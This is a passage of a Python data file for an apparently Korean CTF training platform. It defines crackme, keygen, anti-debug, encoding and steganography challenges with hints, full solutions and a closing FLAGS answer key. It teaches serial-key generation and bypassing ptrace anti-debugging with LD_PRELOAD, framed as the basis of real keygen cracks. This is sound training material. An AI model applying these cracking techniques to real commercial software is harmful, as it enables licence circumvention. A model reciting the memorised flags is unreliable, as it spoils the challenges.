    printf("=== keygen_check: 올바른 시리얼을 찾아내세요 (형식: 1234-5678) ===\\n");
    printf("Serial: ");
    fflush(stdout);
    if (scanf("%31s", input) != 1) return 1;

    if (check_serial(input)) {
        printf("Valid! flag: RE{w31ght3d_ch3cksum_cr4ck3d}\\n");
    } else {
        printf("Invalid serial.\\n");
    }
    return 0;
}
""",
        "build_steps": [
            "위 소스를 keygen_check.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -no-pie -o keygen_check keygen_check.c",
            "실전에서는 소스 없이 바이너리만 Ghidra에 넣는다고 가정하고 진행하세요.",
        ],
        "analysis_steps": [
            "Ghidra로 keygen_check를 Import → Auto Analyze 후 main()과 check_serial() 디컴파일을 확인합니다.",
            "형식 검사(길이 9, 5번째 문자 '-')와 반복문 안의 가중합 계산 로직을 읽습니다.",
            "각 자리 숫자에 곱해지는 가중치(자리 인덱스+1, '-' 위치는 건너뜀)를 정리합니다.",
            "가중합이 정확히 얼마와 같아야 통과하는지(목표값) 확인합니다.",
            "목표값을 만족하는 숫자 8개를 파이썬으로 아무거나 찾아 시리얼을 구성해봅니다 (정답은 하나가 아닙니다).",
            "만든 시리얼을 실제로 keygen_check에 입력해 flag가 출력되는지 확인합니다.",
        ],
        "hints": [
            "인덱스는 0부터 시작하고, '-'가 있는 4번 인덱스는 건너뜁니다. 가중치는 (인덱스+1)입니다.",
            "즉 가중치는 순서대로 1,2,3,4,(건너뜀),6,7,8,9 입니다.",
            "목표 가중합은 250입니다. 각 자리는 0~9 사이 숫자이므로 나올 수 있는 최댓값은 9×(1+2+3+4+6+7+8+9)=360입니다 — 250은 충분히 달성 가능합니다.",
            "Python으로 무작위 또는 완전탐색으로 조건을 만족하는 8자리를 찾은 뒤 'NNNN-NNNN' 형식으로 조립하면 됩니다.",
        ],
        "solution": """1. gcc -no-pie -o keygen_check keygen_check.c 로 빌드합니다.
2. Ghidra로 check_serial()을 디컴파일하면 다음 로직을 확인할 수 있습니다:
   - 길이 9, serial[4]=='-' 검사
   - sum += (serial[i]-'0') * (i+1)  (i==4 제외)
   - sum == 250 이어야 통과
3. 조건을 만족하는 시리얼을 파이썬으로 찾습니다 (예시):

   weights = [1,2,3,4,6,7,8,9]
   # 무작위/완전탐색으로 sum(d*w for d,w in zip(digits,weights)) == 250 인 digits 8개를 찾음
   # 예: 6488-7719  (6*1+4*2+8*3+8*4 + 7*6+7*7+1*8+9*9 = 250)

4. ./keygen_check 를 실행해 6488-7719 (혹은 직접 찾은 다른 유효한 시리얼)를 입력하면
   flag가 출력됩니다: RE{w31ght3d_ch3cksum_cr4ck3d}

이 챌린지의 핵심은 '정답 하나를 찾는' crackme v1과 달리, 알고리즘 자체를 이해하면
조건을 만족하는 시리얼을 스스로 '생성'할 수 있다는 것입니다 — 이것이 실제 keygen(제품 키
생성기) crack의 원리입니다.
""",
    },
    {
        "id": "reverse-antidebug",
        "category": "reverse",
        "title": "antidebug_crackme: 안티 디버깅 탐지 우회하기",
        "difficulty": "중급~고급",
        "tool_focus": "ghidra",
        "situation": (
            "이 프로그램은 시작하자마자 디버거(ptrace)가 붙어있는지 검사하고, 감지되면 즉시 "
            "종료합니다. gdb로 무작정 실행하면 비밀번호를 입력해보기도 전에 프로그램이 꺼져버립니다."
        ),
        "objective": "안티 디버깅 기법(PTRACE_TRACEME 자가 검사)의 원리를 이해하고, 이를 우회하는 여러 접근법(정적 분석으로 우회 자체를 회피, 동적 패치/LD_PRELOAD로 우회)을 익힙니다.",
        "source_filename": "antidebug_crackme.c",
        "source_code": """// antidebug_crackme.c — REVERSE 103: 안티 디버깅 탐지 우회하기
// gcc -no-pie -o antidebug_crackme antidebug_crackme.c
#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>

static int is_being_debugged(void) {
    // 이미 디버거(ptrace)가 붙어있으면 PTRACE_TRACEME 호출이 실패(-1)한다.
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        return 1;
    }
    return 0;
}

int main(void) {
    char input[64];

    if (is_being_debugged()) {
        printf("디버거가 감지되었습니다. 종료합니다.\\n");
        return 1;
    }

    printf("=== antidebug_crackme: 디버거 탐지를 우회하고 비밀번호를 맞혀보세요 ===\\n");
    printf("Password: ");
    fflush(stdout);
    if (scanf("%63s", input) != 1) return 1;

    if (strcmp(input, "byp4ss_th3_d3bugg3r") == 0) {
        printf("Correct! flag: RE{4nt1_d3bug_byp4ss3d}\\n");
    } else {
        printf("Wrong password.\\n");
    }
    return 0;
}
""",
        "build_steps": [
            "위 소스를 antidebug_crackme.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -no-pie -o antidebug_crackme antidebug_crackme.c",
            "일반 실행(./antidebug_crackme)은 정상 동작하지만, gdb ./antidebug_crackme 후 run 하면 안티 디버깅에 걸려 바로 종료되는 것을 먼저 확인해보세요.",
        ],
        "analysis_steps": [
            "가장 쉬운 방법(권장): gdb로 실행하지 말고, Ghidra로 정적 분석만 하세요. Ghidra는 바이너리를 실행하지 않으므로 ptrace 안티 디버깅 검사가 애초에 동작하지 않습니다.",
            "Ghidra에서 main()을 디컴파일해 strcmp() 비교 대상 문자열(비밀번호)을 그대로 읽어냅니다.",
            "(심화, 선택) 동적 분석으로도 우회해보고 싶다면: LD_PRELOAD로 항상 성공(0)을 반환하는 가짜 ptrace() 함수를 만들어 실제 ptrace 호출을 가로채거나, gdb에서 ptrace 호출 직후 반환값(rax)을 0으로 강제 설정해보세요.",
        ],
        "hints": [
            "안티 디버깅은 '프로그램이 실행될 때' 디버거 여부를 검사하는 기법입니다 — 애초에 실행하지 않는 정적 분석(Ghidra)에는 통하지 않습니다.",
            "strcmp(input, \"...\")처럼 비교 대상 문자열이 하드코딩된 경우, Ghidra 디컴파일 결과나 strings 명령으로 바로 확인할 수 있습니다.",
            "동적 우회를 시도한다면: gcc -shared -fPIC -o fake_ptrace.so fake_ptrace.c 로 항상 0을 반환하는 ptrace()를 만들고 LD_PRELOAD=./fake_ptrace.so gdb ./antidebug_crackme 로 실행해보세요.",
            "이 기법(자가 ptrace 검사)은 다른 디버거를 붙이면(예: 이미 gdb가 붙은 프로세스에 다시 ptrace 시도) 실패하므로 감지되는 원리입니다.",
        ],
        "solution": """1. gcc -no-pie -o antidebug_crackme antidebug_crackme.c 로 빌드합니다.
2. (확인용) gdb ./antidebug_crackme 후 run 하면 "디버거가 감지되었습니다"가 뜨며 바로 종료되는 것을 봅니다.
3. 권장 풀이 — 정적 분석: Ghidra로 antidebug_crackme를 Import → Auto Analyze → main() 디컴파일.
   strcmp(input, "byp4ss_th3_d3bugg3r") 비교 로직이 그대로 보입니다. 실행/디버깅 없이 바로 정답을 알 수 있습니다.
4. ./antidebug_crackme 를 (디버거 없이) 정상 실행해 byp4ss_th3_d3bugg3r 를 입력하면
   flag가 출력됩니다: RE{4nt1_d3bug_byp4ss3d}

핵심 교훈: 안티 디버깅은 '동적 분석(디버거로 실행)'만 방해할 뿐, '정적 분석(Ghidra로 읽기만
하기)'은 막지 못합니다. 실전에서 안티 디버깅이 걸린 바이너리를 만나면, 무조건 우회를
시도하기 전에 정적 분석만으로 풀리는지부터 확인하는 것이 효율적입니다.
""",
    },
    {
        "id": "misc-encoding-chain",
        "category": "misc",
        "title": "인코딩 체인 풀기: 4단계를 벗겨내면 flag",
        "difficulty": "입문",
        "tool_focus": "cyberchef",
        "situation": (
            "CTF Misc 카테고리에서 가장 흔한 유형입니다: 문자열 하나가 주어지는데, 겉보기엔 "
            "Base64 같지만 디코딩해도 바로 flag가 나오지 않습니다. 여러 인코딩이 겹겹이 씌워져 "
            "있기 때문입니다."
        ),
        "objective": "Base64/Hex/ROT13/문자열 뒤집기를 눈으로 구분하고, 순서대로 하나씩 벗겨내는 습관을 기릅니다.",
        "source_filename": "encoded_flag.txt",
        "source_code": "N2Q3NDYxMzE3MTMwNzA2MTMzNWY3MzMwNWY2NjY1MzM2YzM0Nzk3YjUwNDY1NjVh",
        "build_steps": [
            "위 문자열을 encoded_flag.txt로 저장합니다 (아래 [파일 다운로드] 버튼 사용 가능).",
            "별도 컴파일/실행 환경이 필요 없습니다 — CyberChef(웹) 또는 Python만 있으면 됩니다.",
        ],
        "analysis_steps": [
            "문자열의 생김새를 관찰합니다: 알파벳 대소문자+숫자로만 이루어져 있고 길이가 4의 배수입니다 → Base64로 추정.",
            "Base64로 디코딩합니다. 결과가 0-9a-f로만 이루어진 문자열이면 → Hex(16진수)로 추정.",
            "Hex를 아스키로 디코딩합니다. 결과가 읽을 수 있는 문자이긴 한데 flag 형식이 아니라면 → 알파벳 치환 암호(ROT13 등)를 의심합니다.",
            "ROT13을 적용해봅니다 (또는 CyberChef의 'Magic' 기능으로 자동 탐지). 결과가 'MISC{'로 끝나고 '}'로 시작한다면 → 문자열이 통째로 뒤집혀 있는 것입니다.",
            "마지막으로 문자열을 뒤집으면(reverse) flag가 나옵니다.",
        ],
        "hints": [
            "알파벳과 숫자, 종종 +/=로 끝나는 문자열은 Base64일 가능성이 높습니다.",
            "CyberChef(온라인 도구)의 'Magic' 오퍼레이션은 여러 인코딩을 자동으로 시도해 후보를 보여줍니다 — 처음엔 이걸로 감을 잡아도 됩니다.",
            "0-9와 a-f만 있는 문자열은 거의 항상 Hex(16진수)입니다.",
            "flag의 앞뒤가 뒤바뀌어 보인다면('}'로 시작하는 등) 문자열 전체가 reverse된 것입니다.",
        ],
        "solution": """1. 주어진 문자열은 Base64입니다 → Base64 디코딩
2. 결과는 16진수(hex) 문자열입니다 → hex 디코딩(바이트를 아스키로 변환)
3. 결과는 ROT13이 적용된 상태입니다 → ROT13 적용 (자기 자신이 역연산이라 한 번 더 적용하면 원복)
4. 결과는 flag가 통째로 뒤집힌 상태입니다 → 문자열 reverse

Python으로 한 번에:
import base64, codecs
s = "N2Q3NDYxMzE3MTMwNzA2MTMzNWY3MzMwNWY2NjY1MzM2YzM0Nzk3YjUwNDY1NjVh"
step1 = base64.b64decode(s).decode()
step2 = bytes.fromhex(step1).decode()
step3 = codecs.decode(step2, 'rot_13')
flag = step3[::-1]
print(flag)  # MISC{l4y3rs_0f_3nc0d1ng}
""",
    },
    {
        "id": "misc-zerowidth-stego",
        "category": "misc",
        "title": "보이지 않는 flag: 제로폭 문자 스테가노그래피",
        "difficulty": "중급",
        "tool_focus": "python",
        "situation": (
            "평범해 보이는 메모 한 줄이 주어졌습니다. 화면에는 아무 이상이 없어 보이지만, "
            "실제로는 눈에 보이지 않는 유니코드 문자들이 뒤에 숨어 있습니다."
        ),
        "objective": "제로폭 문자(Zero-Width Character)를 이용한 텍스트 스테가노그래피의 원리를 이해하고, 실제로 숨겨진 데이터를 추출해봅니다. 이 기법은 실제로 워터마킹·정보 유출 탐지에도 쓰입니다.",
        "source_filename": "hidden_message.txt",
        "source_code": _MISC_ZW_TEXT,
        "build_steps": [
            "위 내용을 hidden_message.txt로 저장합니다 (아래 [파일 다운로드] 버튼을 꼭 사용하세요 — 화면에서 직접 복사하면 보이지 않는 문자가 누락될 수 있습니다).",
            "파이썬만 있으면 됩니다. len()으로 파일의 문자 수를 세어보면 눈에 보이는 문장보다 훨씬 길다는 것을 알 수 있습니다.",
        ],
        "analysis_steps": [
            "Python으로 파일을 읽고 len(text)를 확인합니다 — 눈에 보이는 문장 길이(약 77자)보다 훨씬 깁니다.",
            "각 문자를 ord()로 확인하며 U+200B(zero-width space)나 U+200C(zero-width non-joiner)처럼 이상한 코드포인트가 있는지 찾아봅니다.",
            "두 문자 중 하나를 비트 0, 다른 하나를 비트 1로 놓고 순서대로 이어붙입니다.",
            "8비트씩 끊어 바이트로 만들고 아스키로 디코딩하면 flag가 나옵니다.",
        ],
        "hints": [
            "겉보기엔 평범한 한 문장인데 파일 크기가 이상하게 크다면, 눈에 안 보이는 문자가 숨어있다는 신호입니다.",
            "U+200B(ZERO WIDTH SPACE)와 U+200C(ZERO WIDTH NON-JOINER)는 화면에 아무것도 그리지 않지만 실제로 존재하는 문자입니다.",
            "숨겨진 문자들은 눈에 보이는 문장 '뒤에' 이어붙어 있습니다.",
            "두 종류의 문자가 등장하는 패턴을 0과 1로 바꿔서 8개씩 묶으면 bytes.decode()로 문자열이 됩니다.",
        ],
        "solution": """1. hidden_message.txt를 UTF-8로 읽습니다.
2. 텍스트에서 U+200B, U+200C 두 문자만 걸러냅니다.
3. U+200B를 0, U+200C를 1로 바꿔 비트 문자열을 만듭니다.
4. 8비트씩 끊어 바이트로 변환하고 디코딩합니다.

Python:
ZWS, ZWNJ = '\\u200b', '\\u200c'
text = open('hidden_message.txt', encoding='utf-8').read()
bits = ''.join('1' if c == ZWNJ else '0' for c in text if c in (ZWS, ZWNJ))
flag = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8)).decode()
print(flag)  # MISC{z3ro_w1dth_1s_1nv1s1bl3}
""",
    },
    {
        "id": "misc-osint-clues",
        "category": "misc",
        "title": "흩어진 단서 조합하기: 가상 온보딩 문서 OSINT",
        "difficulty": "입문",
        "tool_focus": "logic",
        "situation": (
            "가상의 회사(ACME Corp)의 내부 온보딩 문서 일부가 주어집니다. 실제 인물이나 회사가 "
            "아닌, 교육 목적으로 만든 가상의 문서입니다. flag는 문서에 그대로 적혀있지 않고, "
            "여러 문단에 흩어진 규칙과 정보를 조합해야 완성됩니다."
        ),
        "objective": "하나의 출처만으로는 답이 나오지 않고, 여러 단서를 교차 대조해야 결론이 나오는 실제 OSINT의 사고 흐름을 연습합니다.",
        "source_filename": "onboarding_notes.txt",
        "source_code": """=== ACME Corp — 2026년 온보딩 가이드 (내부용, 교육 목적의 가상 문서) ===

사내 계정 규칙:
- Slack 핸들 형식: [이름 이니셜 2자, 소문자, First name + Last name 순서] + [입사연도 뒤 2자리] + [부서코드 2자리]
- 부서코드: ENG=07, SEC=13, HR=21, OPS=42

인수인계 메모 (일부):
"신입 Security 팀 인원 Jordan Lee가 2024년에 입사했습니다.
계정 발급 당시 임시로 남아있던 값은 'MISC{' + 그의 Slack 핸들 + '}' 형식이었습니다 (전체 소문자).\"""",
        "build_steps": [
            "위 내용을 onboarding_notes.txt로 저장합니다 (아래 [파일 다운로드] 버튼 사용 가능).",
            "특별한 도구 없이 문서를 꼼꼼히 읽는 것만으로 풀 수 있습니다.",
        ],
        "analysis_steps": [
            "문서에서 규칙(Slack 핸들 형식, 부서코드 표)을 먼저 정리합니다.",
            "인물 정보(이름, 입사연도, 소속 팀)를 별도로 정리합니다.",
            "이름에서 First name과 Last name의 이니셜을 소문자로 뽑아냅니다.",
            "입사연도의 뒤 2자리를 뽑아냅니다.",
            "소속 팀명을 부서코드 표에서 찾아 매칭합니다.",
            "규칙에 정의된 순서대로 세 조각을 이어붙여 Slack 핸들을 완성하고, flag 형식에 대입합니다.",
        ],
        "hints": [
            "규칙 문단과 인물 정보 문단이 분리되어 있습니다 — 표를 만들어 정리하면 헷갈리지 않습니다.",
            "Jordan Lee의 이니셜은 First name(Jordan)의 J + Last name(Lee)의 L 순서로 'jl'입니다.",
            "'Security 팀'은 부서코드 표의 SEC과 같은 의미입니다 (SEC=13).",
            "입사연도 2024의 '뒤 2자리'는 24입니다. [이니셜][연도][부서코드] 순서로 이어붙이세요.",
        ],
        "solution": """1. 이름 이니셜: Jordan(J) + Lee(L) = 'jl'
2. 입사연도 뒤 2자리: 2024 -> '24'
3. 부서코드: Security = SEC = '13'
4. Slack 핸들 = 'jl' + '24' + '13' = 'jl2413'
5. flag = MISC{jl2413}

이 챌린지의 핵심은 한 문단만 봐서는 답이 안 나온다는 것입니다. 실제 OSINT도 SNS 프로필,
공개 문서, 도메인 등록 정보처럼 서로 다른 출처의 조각 정보를 교차 대조해야 결론이 나오는
경우가 대부분입니다.
""",
    },
]

FLAGS = {
    "pwn-ret2win": "PWN{r3t2w1n_st4ck_sm4sh1ng_101}",
    "pwn-ret2system": "PWN{r3t2sy5tem_ropp1ng_w1th_style}",
    "pwn-fmtstr": "PWN{f0rm4t_str1ng_1nf0_l34k}",
    "reverse-crackme": "RE{gh1dra_and_x0r_ar3_fr1ends}",
    "reverse-keygen": "RE{w31ght3d_ch3cksum_cr4ck3d}",
    "reverse-antidebug": "RE{4nt1_d3bug_byp4ss3d}",
    "misc-encoding-chain": "MISC{l4y3rs_0f_3nc0d1ng}",
    "misc-zerowidth-stego": _MISC_ZW_FLAG,
    "misc-osint-clues": "MISC{jl2413}",
}


def get_challenge(challenge_id: str) -> dict | None:
    return next((c for c in CHALLENGES if c["id"] == challenge_id), None)
